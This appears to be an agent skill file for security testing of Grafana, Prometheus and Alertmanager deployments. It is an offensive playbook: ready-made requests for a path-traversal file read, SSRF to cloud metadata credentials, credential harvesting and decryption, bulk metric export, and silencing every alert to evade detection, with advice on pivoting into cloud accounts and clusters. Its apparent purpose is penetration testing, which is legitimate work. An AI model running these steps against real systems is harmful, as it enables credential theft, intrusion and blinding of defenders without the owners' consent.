---
name: grafana_prometheus
description: Grafana, Prometheus, Alertmanager and exporter security testing — turning exposed observability into SSRF, credential theft, RCE, and lateral movement into the internal network
---

# Grafana & Prometheus (Observability Stack)

Observability stacks (Grafana + Prometheus + Alertmanager + Loki/Tempo/Jaeger + exporters) are among the highest-value pivots on a network. They are chronically exposed (300k+ internet-facing Grafana instances on Shodan), run with weak/no auth, hold plaintext credentials for every backend they touch, and sit in a network position that reaches internal services and cloud metadata. Treat a reachable observability endpoint not as the finding but as the **entry point**: the goal is to pivot from "monitoring is exposed" into data-source credential theft, SSRF into the internal network, cloud key compromise, RCE, and cluster/host takeover.

## Attack Surface

**Grafana** (default `:3000`)
- Web UI + REST API (`/api/*`), login, org/user management, snapshots
- Data sources: stored connection details + credentials for Prometheus, Loki, Tempo, MySQL/Postgres, Elasticsearch, InfluxDB, CloudWatch, Azure Monitor, etc.
- Data source **proxy** (`/api/datasources/proxy/...`, `/api/ds/query`) — server-side HTTP client → SSRF primitive
- Plugins (incl. Image Renderer, Infinity) — extra SSRF/RCE surface
- Alerting → contact points/webhooks (outbound HTTP, another SSRF vector)

**Prometheus** (default `:9090`)
- Query API (`/api/v1/query`, `/graph`), config/target/status endpoints, federation, admin/lifecycle API

**Alertmanager** (default `:9093`)
- Alert/silence API (`/api/v2/*`), config with receiver credentials

**Exporters / adjacent** — node_exporter (`:9100`), cAdvisor/kubelet (`:4194`/`:10250`), kube-state-metrics (`:8080`), Pushgateway (`:9091`), Loki (`:3100`), Tempo, Jaeger UI (`:16686`), Thanos/Cortex/Mimir/VictoriaMetrics

## Reconnaissance

**Fingerprint & version** (version drives which CVEs apply)
```
GET /api/health                     # Grafana: {"version":"...","commit":"..."}
GET /api/frontend/settings          # buildInfo, enabled auth, datasource types
GET /login                          # Grafana login page / footer version
GET /api/v1/status/buildinfo        # Prometheus version
GET /metrics                        # any exporter → prometheus/node/go_* series
```

**Auth posture — always test unauthenticated first**
```
GET /api/datasources                # Grafana: 200 = anon/viewer has admin-ish read
GET /?orgId=1                        # anonymous access enabled? lands on dashboards
GET /api/v1/targets                  # Prometheus: 200 = no auth
GET /api/v2/status                   # Alertmanager: 200 = no auth
```

**Credential entry points**
- Grafana default creds `admin:admin` (the first-login change prompt has a **Skip** button — ~1 in 5 internet-facing instances still accept it)
- Anonymous org access (`auth.anonymous`), open sign-up, guest/viewer roles
- Leaked Grafana API keys / service account tokens (`Authorization: Bearer glsa_...` / `eyJ...`) in JS bundles, git, CI logs

## Key Vulnerabilities & CVEs

### CVE-2021-43798 — Grafana pre-auth path traversal (arbitrary file read)
Grafana 8.0.0-beta1 → 8.3.0. Directory traversal through the plugin static route reads any file the process can, **no auth required**. Every install ships pre-installed plugins, so the path always exists.
```
curl --path-as-is 'http://host:3000/public/plugins/mysql/../../../../../../../../etc/passwd'
# other plugin ids that always exist: prometheus, graph, text, alertlist, table-old
```
High-value reads:
- `/etc/grafana/grafana.ini` and `conf/defaults.ini` → `secret_key`, admin password, SMTP/LDAP creds
- `/var/lib/grafana/grafana.db` (SQLite) → `data_source.secure_json_data` (AES-encrypted with `secret_key` → decrypt to recover backend passwords/tokens), session tokens, API key hashes
- `/proc/self/environ`, cloud credential files (`~/.aws/credentials`, k8s SA token at `/var/run/secrets/kubernetes.io/serviceaccount/token`)

### CVE-2024-9264 — Grafana SQL Expressions RCE + LFI (DuckDB)
Grafana **v11.0.0–11.2.x** (10.x not affected). The experimental SQL Expressions feature passes user input to the `duckdb` CLI insufficiently sanitized → command injection + arbitrary file read. Enabled by default for the API (feature-flag bug); exploitable **only if the `duckdb` binary is in Grafana's `$PATH`** (not shipped by default). Any user with **Viewer or higher** can exploit. CVSS 9.4.
- Probe: is `duckdb` present? Try the SQL Expressions query path; LFI via `read_csv`/`read_blob`-style functions, command injection via DuckDB's shell/`install`/`load` extension mechanics.
- Mitigation you'll see: remove `duckdb` from PATH.

### CVE-2025-4123 — Grafana open redirect + stored XSS → SSRF chain
Double-encoded traversal (`..%2f`) into the client path/`/redirect` forwards the victim to an attacker origin that serves a malicious plugin manifest → JS executes in the trusted grafana origin (stored XSS). If the **Image Renderer** plugin is present, escalate to full-read SSRF:
```
POST /api/render?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
No creds needed when anonymous access is on (common in demo/lab).

### CVE-2021-39226 / CVE-2024-1313 — Grafana snapshot auth bypass
Unauthenticated view (and, with `public_mode`, delete) of the lowest-key snapshot via `/api/snapshots/:key` and `/dashboard/snapshot/:key`; CVE-2024-1313 lets a user in a *different org* delete snapshots by view key. Walk snapshot IDs to harvest dashboard data / leaked query values.

### Prometheus / Alertmanager — exposure is the vuln (no auth by default)
Prometheus and Alertmanager ship with **no authentication**; the docs explicitly say do not expose them. There is rarely a CVE — reachability itself is the finding, and the payoff is recon + credential leakage + pivoting (below).

## Pivoting: Observability → Deeper Compromise

This is the core value. Chain each exposure into something that matters. Always articulate the pivot in the finding, not just the exposed endpoint.

### 1. Grafana data-source proxy → full-read SSRF (internal net + cloud metadata)
Grafana OSS ships a **no-op URL validator** and an **empty `data_source_proxy_whitelist`** (empty = allow all). The proxy resolves the proxied path against the **selected data source's configured base URL**, so to reach an arbitrary host you must first create (or edit) a data source whose URL is the internal/metadata target — this needs data-source write permission (Editor/Admin, or any role granted `datasources:create`/`:write`). Reusing an ordinary Prometheus data-source id and appending a metadata path just hits Prometheus, not the metadata service — do not report that as SSRF. Once a data source points at the target, the proxy issues the request server-side and returns the **full response body**.
```
# Step 1: create/edit a data source with an attacker-chosen base URL, e.g.
POST /api/datasources  {"name":"x","type":"prometheus","access":"proxy",
                        "url":"http://169.254.169.254"}       # returns the new <id>
# Step 2: relay through THAT data source's id (path appended to its base URL):
GET /api/datasources/proxy/<id>/latest/meta-data/iam/security-credentials/<role>   # AWS IMDSv1
# GCP: base url http://metadata.google.internal + header Metadata-Flavor: Google
#      → /computeMetadata/v1/instance/service-accounts/default/token
# Internal APIs, k8s API server, admin panels, other cloud services (one DS per host)
```
Pivot: metadata creds → cloud account; internal API reads → data; network mapping → next target. Also test the **alerting contact-point/webhook** (attacker-controlled outbound URL) and plugin SSRFs (e.g. Infinity CVE-2025-8341) as independent vectors. The **Image Renderer** is an SSRF vector too, but not via an arbitrary-URL proxy: it renders Grafana dashboard/panel render routes (`/render/d-solo/...`), so the SSRF arises when a render request is coerced to fetch an internal URL (e.g. chained with CVE-2025-4123), not from a `?url=` parameter.

### 2. Grafana admin → harvest every backend credential
Once authenticated (default creds, anon-admin, leaked token, or after CVE-2021-43798):
```
GET /api/datasources          # host, port, db, user for 5–15 backends
GET /api/admin/settings        # SMTP, LDAP bind, OAuth secrets, DB DSN (grafana.ini runtime)
```
Grafana stores backend passwords/tokens encrypted (`secureJsonData`) — the API won't echo them, but you can (a) use the data source proxy to **query the backend directly through Grafana** (no plaintext needed), or (b) decrypt `grafana.db` `secure_json_data` with the leaked `secret_key` (from grafana.ini) offline. Each recovered credential (Postgres, MySQL, Elasticsearch, CloudWatch/Azure keys) is a fresh pivot into that system.

### 3. Prometheus config/targets → leaked scrape credentials + inventory
```
GET /api/v1/status/config      # loaded prometheus.yml
GET /api/v1/targets            # every scrape target + discovery metadata labels
```
Prometheus renders secret-typed fields (`basic_auth.password`, `authorization.credentials`, bearer tokens, OAuth client secrets — including inside `remote_write`/`remote_read`) as `<secret>` in the config response, so do **not** report those as leaked unless the actual value is shown. What genuinely leaks: **usernames** (`basic_auth.username`), and — critically — **credentials embedded in target/endpoint URLs** (`https://user:pass@host/...`), which are *not* masked. `remote_write`/`remote_read` blocks still reveal internal backend endpoints (Grafana Cloud/Cortex/Mimir/Thanos hosts) and usernames even with secrets redacted. `kubernetes_sd_configs` and cloud SD expose internal DNS and can surface creds via URL fields. Target lists + `__meta_*`/`__address__` labels = a free internal network map (hostnames, ports, k8s namespaces, cloud instance IDs).

### 4. PromQL / metrics → internal topology, versions → known-CVE targeting
Metrics are a recon goldmine. Query without auth:
```
GET /api/v1/query?query=up                          # every monitored service (host:port)
GET /api/v1/query?query=node_uname_info             # kernel/OS/host
GET /api/v1/query?query=node_dmi_info               # cloud provider / hardware
GET /api/v1/query?query=node_network_info           # interfaces, internal IPs/MACs
GET /api/v1/query?query=kube_pod_info               # pods, namespaces, node IPs (KSM)
GET /api/v1/query?query=kube_node_info              # node hostnames, kubelet/kubeproxy versions
GET /api/v1/query?query={__name__=~"..._build_info"} # exact component versions
GET /api/v1/label/__name__/values                   # enumerate all metric names → app inventory
GET /federate?match[]={__name__=~".%2b"}             # bulk-exfil series via federation
```
Pivot: exact versions (`*_build_info`, `kube_node_info`) → map to CVEs and attack the vulnerable components; `up`/`kube_pod_info` → target list of internal services normally invisible from outside. cAdvisor/kubelet and kube-state-metrics reveal container images, args, labels (sometimes secrets in env-derived labels), and full cluster layout.

### 5. Alertmanager → credential theft, SSRF, and alert suppression (anti-forensics)
```
GET /api/v2/status             # config (receiver creds often masked, structure/routes leak)
POST /api/v2/silences          # unauth in default deploys → silence ALL alerts
```
- Receiver config (`alertmanager.yml`) holds **plaintext** Slack webhook URLs, PagerDuty routing keys, SMTP passwords, OpsGenie/VictorOps keys — steal via file read (CVE-2021-43798 style) or config access; reuse to spoof alerts / social-engineer on-call.
- Webhook receivers = SSRF: if you can influence the receiver URL, point it at internal endpoints.
- Silence abuse: `POST /api/v2/silences` with matcher `alertname=~".+"` for 30d suppresses security/ops alerting while you operate — call this out as a **detection-evasion** impact.

### 6. Logs/traces backends (Loki, Tempo, Jaeger) → secrets in transit
Exposed Loki (`/loki/api/v1/query_range`), Tempo, and Jaeger UI (`:16686`) frequently contain **request bodies, headers, tokens, session cookies, SQL, and stack traces** captured from real traffic. Query them for `authorization`, `password`, `token`, `set-cookie`, PII. A single logged bearer token or session cookie is a direct account/service takeover.

## Testing Methodology

1. **Discover** stack ports/services (`:3000/:9090/:9093/:9100/:3100/:16686`, `/metrics`, `/api/health`).
2. **Fingerprint versions** → shortlist applicable CVEs (43798, 9264, 4123, 39226/1313, Infinity 8341).
3. **Auth matrix** — unauth vs anon vs viewer vs default creds vs leaked token, per component.
4. **Recon-pivot** — pull Prometheus config/targets + PromQL inventory; enumerate Grafana `/api/datasources`.
5. **SSRF-pivot** — data source proxy / render / webhook → internal services + `169.254.169.254`.
6. **Credential-pivot** — file read (43798) → `secret_key` → decrypt `grafana.db`; scrape/remote_write/receiver creds; then reuse against each backend.
7. **Deepen** — RCE (9264 if `duckdb` present), cloud account via metadata, k8s SA token, DB access; demonstrate real impact.

## Validation

- SSRF: show the **full body** of an internal-only URL (metadata creds, internal API JSON) returned through Grafana — not just a timing/blind signal.
- Credential theft: show the leaked secret AND prove reuse (authenticate to the backend / cloud), or clearly explain the reuse path.
- File read (43798): return contents of `/etc/passwd` or `grafana.ini` with `--path-as-is`; note affected version.
- RCE (9264): confirm `duckdb` in PATH first; demonstrate command execution or file read; note version 11.x.
- Recon: for Prometheus/Alertmanager exposure, pair the open endpoint with the concrete sensitive data recovered (leaked creds, internal inventory) so the finding shows impact, not just "it's reachable".

## False Positives / Down-rate

- Endpoint reachable only from localhost / same trusted segment by design, behind an authenticating reverse proxy (test through the real ingress).
- Grafana Enterprise (real URL validator) or OSS with a configured `data_source_proxy_whitelist` → SSRF blocked.
- CVE-2024-9264 with **no `duckdb` in PATH** → not exploitable (do not report as RCE).
- Patched versions (Grafana ≥ the fixed release for each CVE; check `/api/health`).
- **Demo/sandbox instances with synthetic data** — down-rate per demo-data guidance; exposed monitoring of a throwaway target is low impact.
- Metrics that are genuinely public/non-sensitive (e.g. an intentionally public status page).

## Impact

- Cloud account compromise (metadata creds via SSRF), internal network read access, and network mapping.
- Theft of every backend credential Grafana/Prometheus/Alertmanager touches → lateral movement into DBs, Elasticsearch, cloud APIs.
- RCE on the Grafana host (CVE-2024-9264) and arbitrary file read (CVE-2021-43798).
- Kubernetes cluster recon → SA token / kubelet exposure → cluster compromise.
- Alert suppression for detection evasion; secret/PII exposure via logs & traces.

## Pro Tips

1. Always fingerprint the version first (`/api/health`, `/api/v1/status/buildinfo`) — it decides RCE vs read vs recon.
2. The exposed dashboard is never the finding; the pivot is. Chain to metadata creds, backend creds, or RCE before reporting.
3. Prometheus `<secret>` masking is incomplete — hunt usernames and **URL-embedded creds** in `/api/v1/status/config` and `remote_write`.
4. Grafana can query its own backends for you via the data source proxy — you don't need the plaintext password to exfil data.
5. `*_build_info` and `kube_node_info` metrics hand you exact component versions — turn them straight into CVE targets.
6. Pair with `ssrf`, `information_disclosure`, `kubernetes`, `aws`/`gcp`, and `authentication_jwt` skills; use `nuclei` templates (`grafana-*`, `prometheus-*`) for fast triage.
7. On k8s, an exposed Prometheus/KSM often reveals the whole cluster topology and image versions with zero auth — prioritize it as a recon multiplier.

## Summary

Grafana and Prometheus are pivot engines, not endpoints. Grafana holds plaintext-recoverable credentials for every backend, proxies arbitrary server-side requests by default (SSRF → cloud metadata), reads arbitrary files (CVE-2021-43798), and can hit RCE (CVE-2024-9264). Prometheus/Alertmanager expose internal inventory, versions, and scrape/receiver credentials with no auth. Treat any reachable observability service as a launch point into the internal network, cloud account, databases, and cluster — and prove the pivot.
